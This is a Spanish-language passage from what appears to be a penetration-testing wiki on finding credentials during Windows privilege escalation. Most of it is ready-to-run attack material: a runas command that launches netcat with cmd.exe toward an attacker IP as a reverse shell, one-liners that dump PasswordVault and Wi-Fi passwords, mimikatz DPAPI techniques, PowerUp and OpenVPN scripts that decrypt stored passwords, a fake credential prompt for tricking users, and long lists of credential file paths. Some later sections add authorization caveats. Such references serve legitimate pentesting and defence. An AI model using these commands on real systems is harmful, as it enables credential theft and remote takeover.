```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Luego puedes usar `runas` con la opción `/savecred` para usar las credenciales guardadas. El siguiente ejemplo ejecuta un binario remoto a través de un recurso compartido SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Uso de `runas` con un conjunto de credenciales proporcionado.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Ten en cuenta que puedes usar mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) o el [módulo de PowerShell de Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Las aplicaciones UWP modernas de Windows, Microsoft Edge y los servicios modernos del sistema almacenan tokens de autenticación y contraseñas en texto plano dentro de `PasswordVault` de Universal Windows Platform (UWP) (también expuesto como `Web Credentials` en `vaultcmd`). Este espacio de almacenamiento está aislado por sesión y se puede descifrar de forma nativa sin privilegios administrativos ni `SeDebugPrivilege`.

Ejecuta este comando de PowerShell en la sesión activa del usuario para volcar y descifrar al instante todos los nombres de usuario y contraseñas en texto plano almacenados:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

La **Data Protection API (DPAPI)** proporciona un método para el cifrado simétrico de datos, utilizado principalmente dentro del sistema operativo Windows para el cifrado simétrico de claves privadas asimétricas. Este cifrado aprovecha un secreto del usuario o del sistema para contribuir significativamente a la entropía.

**DPAPI permite cifrar claves mediante una clave simétrica derivada de los secretos de inicio de sesión del usuario**. En situaciones que implican el cifrado del sistema, utiliza los secretos de autenticación del dominio del sistema.

Las claves RSA de usuario cifradas mediante DPAPI se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [identificador de seguridad](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, almacenada junto con la clave maestra que protege las claves privadas del usuario en el mismo archivo**, suele constar de 64 bytes de datos aleatorios. (Es importante tener en cuenta que el acceso a este directorio está restringido, lo que impide listar su contenido mediante el comando `dir` en CMD, aunque sí se puede listar desde PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Puedes usar el **módulo mimikatz** `dpapi::masterkey` con los argumentos adecuados (`/pvk` o `/rpc`) para descifrarlo.

Los **archivos de credenciales protegidos por la contraseña maestra** suelen encontrarse en:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Puedes usar el **módulo mimikatz** `dpapi::cred` con `/masterkey` adecuado para descifrar.\
Puedes **extraer muchas masterkeys de DPAPI** de la **memoria** con el módulo `sekurlsa::dpapi` (si eres root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciales de PowerShell

Las **credenciales de PowerShell** se suelen usar para tareas de **scripting** y automatización como una forma práctica de almacenar credenciales cifradas. Las credenciales están protegidas mediante **DPAPI**, lo que normalmente significa que solo el mismo usuario en el mismo equipo donde se crearon puede descifrarlas.

Un archivo de credenciales exportado puede tener un nombre de archivo o una ruta `.xml` arbitrarios. Cuando un script o un inventario de archivos indique uno, busca el directorio de perfil real de la cuenta en vez de dar por sentado que es `C:\Users`: [Windows puede ubicar los perfiles en otros lugares](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Que el archivo se pueda leer solo es una pista; [Windows `Export-Clixml` vincula una credencial cifrada al usuario y al equipo que la exportaron](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), y cualquier cuenta recuperada debe tener por separado los permisos válidos para el servicio previsto. Inspecciona primero las rutas y las ACL, sin mostrar valores cifrados ni en texto plano durante la enumeración rutinaria.

Para **descifrar** unas credenciales de PS del archivo que las contiene, puedes hacer lo siguiente:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Comandos ejecutados recientemente

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Administrador de credenciales de Escritorio remoto**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Usa el módulo `dpapi::rdg` de **Mimikatz** con el `/masterkey` adecuado para **descifrar cualquier archivo .rdg**\
Puedes **extraer muchas DPAPI masterkeys** de la memoria con el módulo `sekurlsa::dpapi` de Mimikatz

**mRemoteNG usa un almacén de conexiones diferente.** Inspecciona los archivos XML legibles en `%APPDATA%\mRemoteNG` y en los Documentos del usuario, incluidos archivos con nombres comunes como `config.xml`. Identifica el esquema de conexiones y los atributos `Password` cifrados antes de considerar un archivo XML como una pista de credenciales. El valor almacenado no es una contraseña de DPAPI/RDCMan; su recuperación depende de la configuración de cifrado del archivo y de si se usó una contraseña maestra personalizada. Evita mostrar valores cifrados durante la enumeración general.

Las exportaciones de perfiles de **Remote Desktop Plus** también pueden ser legibles en directorios de usuario o en una carpeta de administración compartida. Una exportación heredada `profiles.xml` tiene entradas `Data/Profile` con elementos `ProfileName`, `Password` y `Secure`. Considera un elemento de contraseña no vacío como una pista de credenciales, sin mostrarlo ni asumir que está en texto plano: [el proveedor señala](https://www.donkz.nl/) que la protección del perfil puede estar vinculada a la cuenta y al equipo que lo crearon, o configurarse con menos restricciones. Confirma el origen del archivo y las condiciones de recuperación antes de confiar en él.

### Sticky Notes

A veces, las personas guardan contraseñas y otra información en aplicaciones de notas adhesivas. La aplicación Sticky Notes empaquetada de Microsoft suele almacenar las notas en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; las aplicaciones antiguas o distintas pueden usar otros almacenes del perfil de usuario, incluido LevelDB. Identifica la aplicación instalada y el formato de almacenamiento antes de concluir que no hay notas porque falta el archivo SQLite.

Si Sticky Notes usa el registro write-ahead de SQLite, una copia de `plum.sqlite` por sí sola puede omitir notas confirmadas recientemente. Conserva el archivo `plum.sqlite-wal` correspondiente junto con una copia coherente de la base de datos, e incluye `plum.sqlite-shm` cuando esté disponible; el índice de memoria compartida se puede reconstruir, pero el WAL forma parte del estado persistente de la base de datos. Consulta [la documentación de WAL de SQLite](https://www.sqlite.org/wal.html). Una nota que contenga el nombre de una cuenta o una contraseña es solo una pista de credenciales: verifica por separado la cuenta, los permisos de acceso y la reutilización de contraseñas. Un registro cifrado de un gestor de contraseñas requiere además su clave de descifrado real y una interpretación específica de la aplicación para poder demostrar un inicio de sesión con mayores privilegios.

### AppCmd.exe

**Ten en cuenta que para recuperar contraseñas de AppCmd.exe necesitas ser Administrator y ejecutarlo con un nivel de integridad High.**\
**AppCmd.exe** se encuentra en el directorio `%systemroot%\system32\inetsrv\`.\
Si este archivo existe, es posible que se hayan configurado algunas **credenciales** y que puedan **recuperarse**.

Este código se extrajo de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Comprueba si existe `C:\Windows\CCM\SCClient.exe` .\
Los instaladores se **ejecutan con privilegios de SYSTEM**, muchos son vulnerables a **DLL Sideloading (información de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Archivos y Registro (Credenciales)

### Artefactos de credenciales en el registro de herramientas de soporte

Algunas instalaciones antiguas de soporte remoto conservan nombres de valores relacionados con contraseñas en claves fijas del registro de la aplicación. Por ejemplo, `SecurityPasswordAES` de TeamViewer identificaba una contraseña estática de sesión configurada en versiones anteriores a la 9, según la [vendor's registry-key explanation](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Un marcador en el nombre del valor solo sirve como pista para la revisión: verifica la versión instalada, los datos legibles del valor, el formato y el comportamiento de autenticación actual antes de evaluar esa credencial. Pasar de una contraseña de soporte remoto a una cuenta de Windows con más privilegios también requiere que la contraseña realmente se reutilice y que exista autorización para esa cuenta. Evita incluir texto cifrado y contraseñas recuperadas en los resultados de enumeración rutinaria.

### Hojas de cálculo compartidas con hojas protegidas

Si se sospecha que un libro compartido legible contiene datos de cuentas, distingue entre **cifrado de archivos** y protección de hojas de cálculo o columnas ocultas. [Microsoft states](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) que la protección de hojas de cálculo controla la edición y no es una función de seguridad; por sí sola, no demuestra que el contenido del libro esté cifrado. Revisa únicamente archivos pertinentes a los que tengas acceso autorizado y evita mostrar posibles secretos durante la enumeración general. Una ruta `.xlsx` legible, una hoja protegida o una columna oculta no demuestran por sí solas que existan credenciales ni que alguna cuenta tenga más privilegios; verifica por separado los datos reales y los derechos actuales de la cuenta.

### Parches de cambios retenidos por el servidor de CI

Un servidor de CI puede conservar los cambios de código fuente enviados en su directorio de datos incluso después de finalizar la compilación. [TeamCity documents](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` como almacenamiento de cambios de ejecución remota; el directorio de datos se puede configurar y no necesariamente está bajo `ProgramData`. Un parche legible puede conservar referencias eliminadas o añadidas a un archivo de credenciales, una clave de cifrado o un script que use ambos. Por ejemplo, un flujo de trabajo de PowerShell con `ConvertTo-SecureString -Key` necesita tanto la clave AES como la cadena cifrada; [Microsoft documents](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) que la clave se proporciona por separado. Primero revisa solo los nombres de los parches accesibles; luego, con autorización, inspecciona el contenido pertinente sin mostrar secretos en los resultados de enumeración rutinaria. Una ruta de parche, un valor cifrado o una referencia a una clave no demuestran por sí solos que exista una credencial válida o acceso a privilegios superiores. Restringe las ACL del directorio de datos y evita incluir secretos en los cambios de compilación.

### Rotación personalizada de contraseñas de administrador local

Un rotador de contraseñas casero puede almacenar una contraseña cifrada de administrador local en un servicio local y mantener las credenciales de su almacén de datos en un archivo `.env` legible o junto al binario de actualización. Revisa conjuntamente la tarea programada del actualizador, la cuenta, las ACL de configuración, el listener y los permisos del almacén de datos. Un almacén de datos accesible solo mediante loopback sigue siendo accesible para un usuario local con credenciales válidas, pero la autenticación por sí sola no demuestra que tenga permiso para leer los registros pertinentes. Si la semilla de cifrado o el material de la clave están accesibles junto al texto cifrado, revisa la derivación exacta de la clave antes de confiar en el cifrado. Un esquema que derive determinísticamente una clave AES de una semilla expuesta mediante Go [`math/rand`](https://pkg.go.dev/math/rand) no es adecuado para proteger esa contraseña; Go documenta que ese paquete no es apropiado para la generación de números aleatorios sensibles a la seguridad. Confirma que cualquier contraseña recuperada siga siendo válida y pertenezca a una cuenta del grupo local Administrators antes de considerarla una vía de escalada. Una tarea programada, una ruta `.env` o un blob cifrado no demuestran ninguna de esas condiciones. Evita incluir contraseñas y material de claves en los resultados de enumeración rutinaria.

Usa [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) para administrar las contraseñas de administrador local. Su almacenamiento respaldado por un directorio o Entra y sus controles de acceso son distintos de los de un almacén de datos local personalizado; [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) también determinan si un usuario autenticado del almacén de datos puede leer un índice específico.

### Archivos de plugin del servidor Java y reutilización de credenciales

Algunos plugins de servidores Java se distribuyen como archivos JAR en el directorio `plugins` de un servidor. Un plugin personalizado legible puede contener configuración o bytecode con una credencial de servicio incrustada. Revisa el archivo únicamente con autorización y evita incluir secretos recuperados en los resultados de enumeración rutinaria. Una ruta de plugin no demuestra por sí sola que exista un secreto, y una contraseña de servicio recuperada solo permite obtener más privilegios si también es válida para una cuenta con más privilegios. Comprueba las ACL de los archivos pertinentes y sustituye las credenciales reutilizadas por secretos distintos. Consulta [PaperMC's plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) para ver la estructura de directorios y [Oracle's JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) para conocer el contenido de los archivos.

### Credenciales de la base de datos integrada de Openfire

Una instalación de Openfire que usa su base de datos integrada puede guardar `openfire.script` en `Openfire\embedded-db`. Si la cuenta actual puede leerlo, revisa conjuntamente los registros `OFUSER` y la propiedad `passwordKey`. La [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) de Openfire indica que las contraseñas pueden almacenarse en texto sin formato o cifradas con una clave guardada en esa propiedad. Una contraseña recuperada solo es relevante para la escalada si sigue siendo válida para una identidad con más privilegios; el nombre del archivo por sí solo no demuestra ni acceso de lectura ni reutilización de credenciales. La ruta es una pista para el inventario, así que evita incluir el contenido de la base de datos y las credenciales en los resultados de enumeración rutinaria.

El archivo independiente `Openfire\conf\openfire.xml` puede revelar los puertos configurados y la interfaz de enlace de la consola de administración, incluso si se usa una base de datos externa. Openfire suele enlazar su consola de administración a loopback; aun así, una cuenta local puede acceder a esa dirección si el listener está activo. Comprueba conjuntamente el listener real, el rol de administrador autorizado, la política de carga de plugins y la identidad del servicio Openfire. Un administrador que pueda instalar un plugin puede hacer que el código del plugin se ejecute en el contexto del servicio, que puede tener muchos privilegios si el servicio se ejecuta como LocalSystem. Una contraseña coincidente o una ruta de configuración legible no demuestran por sí solas el acceso a la consola de administración ni la ejecución de código. Consulta la [installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) del proveedor y la [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Configuración del servidor de gestión forense

Las configuraciones del servidor Velociraptor, que suelen llamarse `server.config.yaml`, pueden contener `CA.private_key` de la CA interna. Si un usuario con menos privilegios puede leer esa clave, podría emitir un certificado de cliente API. Que esto permita obtener más privilegios depende de los roles de usuario del servidor, la accesibilidad de la API y la identidad con la que se ejecutan el servidor o el agente de destino. Una configuración de cliente contiene material distinto; encontrar una no demuestra que se tenga acceso a la CA del servidor. Algunas implementaciones mantienen la clave privada de la CA fuera de línea, por lo que una configuración de servidor legible también podría no contener la clave de firma.

En un servidor Windows, inspecciona las ACL de la configuración del **servidor** en su directorio de instalación y de las copias de seguridad protegidas. Una ubicación posible es `%ProgramFiles%\VelociraptorServer\server.config.yaml`; si difiere, usa la ruta configurada para el servicio. Confirma que la identidad actual pueda leer el archivo y que `CA.private_key` esté realmente presente. Evita mostrar la clave privada en registros o resultados de enumeración. El flujo de trabajo `config api_client` del proveedor usa la clave de la CA para emitir un certificado de cliente, pero también se necesita un rol efectivo en el servidor; crear uno o modificarlo puede requerir acceso de escritura al almacén de datos o un reinicio. Una identidad de servidor privilegiada existente puede ofrecer una vía incluso cuando no se dispone de esos permisos de escritura. Las consultas API con permisos de ejecución se ejecutan en el contexto pertinente del servidor o del agente, que puede tener muchos privilegios.

Protege la configuración del servidor y las copias de seguridad con ACL restrictivas, mantén la clave de firma de la CA fuera de línea siempre que sea posible y limita los roles de la API y el acceso al listener. Consulta la [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) y la [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/).

### Credenciales de PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY es un administrador de sesiones independiente. Su almacén cifrado nativo puede estar en `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, mientras que una copia de seguridad de sesiones exportada puede llamarse `sessions-backup.dat` y estar almacenada en otra ubicación. La [guía de exportación de SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) indica que las exportaciones están cifradas con contraseña y pueden contener sesiones, claves, scripts, etiquetas y relaciones; su [foro de soporte](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifica el almacén nativo. Comprueba primero los permisos y las rutas de los archivos. Encontrar cualquiera de estos archivos no revela su contraseña ni demuestra que alguna credencial guardada siga siendo válida o tenga privilegios superiores.

### Claves de host SSH de PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Claves SSH en el registro

Las claves privadas SSH pueden almacenarse en la clave del registro `HKCU\Software\OpenSSH\Agent\Keys`, así que deberías comprobar si hay algo interesante allí:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Si encuentras alguna entrada dentro de esa ruta, probablemente sea una clave SSH guardada. Está cifrada, pero se puede descifrar fácilmente usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Encontrarás más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Si el servicio `ssh-agent` no está en ejecución y quieres que se inicie automáticamente al arrancar, ejecuta:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Parece que esta técnica ya no es válida. Intenté crear algunas claves SSH, agregarlas con `ssh-add` e iniciar sesión en una máquina mediante SSH. La clave del registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no detectó el uso de `dpapi.dll` durante la autenticación con clave asimétrica.

### Archivos desatendidos

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum_unattend_

Contenido de ejemplo:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Copias de seguridad de SAM y SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Los archivos de copia de seguridad de Windows Imaging (`.wim`) legibles también pueden contener subárboles offline `SAM`, `SECURITY` y `SYSTEM`. Prioriza los directorios de copias de seguridad o imágenes accesibles localmente e inspecciona los **nombres de los miembros** de una imagen antes de extraer nada; que un archivo tenga extensión `.wim` no demuestra que exponga subárboles, y las imágenes habituales `install.wim`, `boot.wim` y de recuperación suelen ser pistas falsas. Un recurso compartido SMB es una vía de acceso independiente y solo debe comprobarse si está dentro del alcance. Consulta las [directrices de Microsoft sobre imágenes de Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) y la [referencia de archivos de subárboles del Registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Credenciales en la nube

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Busca un archivo llamado **SiteList.xml**

### Contraseña de GPP almacenada en caché

Anteriormente, existía una función que permitía implementar cuentas de administrador local personalizadas en un grupo de máquinas mediante Group Policy Preferences (GPP). Sin embargo, este método tenía importantes fallas de seguridad. En primer lugar, cualquier usuario del dominio podía acceder a los objetos de directiva de grupo (GPO), almacenados como archivos XML en SYSVOL. En segundo lugar, cualquier usuario autenticado podía descifrar las contraseñas de esos GPP, cifradas con AES256 mediante una clave predeterminada documentada públicamente. Esto suponía un riesgo grave, ya que podía permitir que los usuarios obtuvieran privilegios elevados.

Para mitigar este riesgo, se desarrolló una función que busca archivos GPP almacenados en caché localmente y que contienen un campo "cpassword" no vacío. Cuando encuentra uno de estos archivos, la función descifra la contraseña y devuelve un objeto personalizado de PowerShell. Este objeto incluye detalles sobre el GPP y la ubicación del archivo, lo que facilita la identificación y corrección de esta vulnerabilidad de seguridad.

Busca estos archivos en `C:\ProgramData\Microsoft\Group Policy\history` o en _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior a W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descifrar el cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Usar crackmapexec para obtener las contraseñas:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Configuración web de IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Ejemplo de web.config con credenciales:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archivos de copia de seguridad en un webroot de IIS

Una copia de seguridad ZIP antigua colocada directamente en un webroot servido puede exponer archivos de configuración anteriores y credenciales reutilizables. Comprueba la ruta física configurada del sitio y si se puede acceder realmente al archivo por HTTP antes de considerarlo una exposición. La ruta predeterminada `C:\inetpub\wwwroot` es solo una posibilidad. Un inventario local rápido puede listar nombres y tamaños sin abrir los archivos:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

El nombre de un archivo comprimido no demuestra que contenga un secreto ni que una credencial recuperada otorgue mayores privilegios.

### Credenciales de OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Registros

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Solicitar credenciales

Siempre puedes **pedirle al usuario que introduzca sus credenciales o incluso las de otro usuario** si crees que puede conocerlas (ten en cuenta que **pedirle** directamente al cliente sus **credenciales** es realmente **arriesgado**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Posibles nombres de archivo que contienen credenciales**

Archivos conocidos que en algún momento contenían **contraseñas** en **texto sin cifrar** o **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
